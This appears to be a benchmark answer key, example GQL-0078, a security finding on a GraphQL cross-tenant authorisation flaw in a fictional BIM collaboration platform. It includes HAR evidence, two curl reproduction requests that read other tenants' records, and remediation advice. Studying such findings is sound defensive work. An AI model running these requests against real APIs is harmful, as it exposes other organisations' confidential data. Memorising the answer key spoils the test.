# Expected Response

## System
- Domain: Construction / BIM
- System: BuildCore BIM Collaboration
- Example ID: GQL-0078

## Priority Findings

### Finding 1: Client-Assumed Authority — BIM Collaboration Resources Accessible Without Server-Side Ownership Validation (Pattern 3.1)
**Severity:** Critical
**Category:** Insecure Design / Client-Assumed Authority

**Summary:**
Per §5.0 (Pattern 3.1 — client-assumed authority): The server trusts the client's claim of authority (the supplied resource IDs) without server-side ownership verification. An attacker from `tenant-0c67` used `bulkResourceLookup` to retrieve BIM collaboration records (`R-2078`, `R-1078`, `R-3078`) belonging to `tenant-1b85`. In construction, this exposes architectural drawings, structural specifications, and BIM models that constitute trade secrets and construction IP.

**Evidence from HAR:**
- Request: `POST https://api.buildcore-bim-colla.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-0c67`
- Mutation: `bulkResourceLookup(ids: ["R-2078", "R-1078", "R-3078"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-1b85"`, `ownerId: "other-user-0c671b85"`, `sensitiveField: "CONFIDENTIAL-0c671b85"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-0c671b85`

**Root Cause (§4.0 RISK-GQL-078):** Server accepts client-supplied resource IDs without ownership verification (client-assumed authority). No server-side tenantId check enforced.

## Steps to Reproduce

### Step 1 — Bulk BIM resource access (HAR)
```bash
curl -s -X POST https://api.buildcore-bim-colla.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0c67" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2078\", \"R-1078\", \"R-3078\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-0c671b85` from `tenant-1b85`. **Secure:** FORBIDDEN.

### Step 2 — Direct resource access (client-assumed authority)
```bash
curl -s -X POST https://api.buildcore-bim-colla.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0c67" \
  -d '{"query": "query { getResource(id: \"R-2078\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Server assumes client has authority over any supplied ID.

## Remediation
1. Server must always verify ownership — never trust client-supplied IDs as authority tokens.
2. Per-ID ownership filter in `bulkResourceLookup`.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
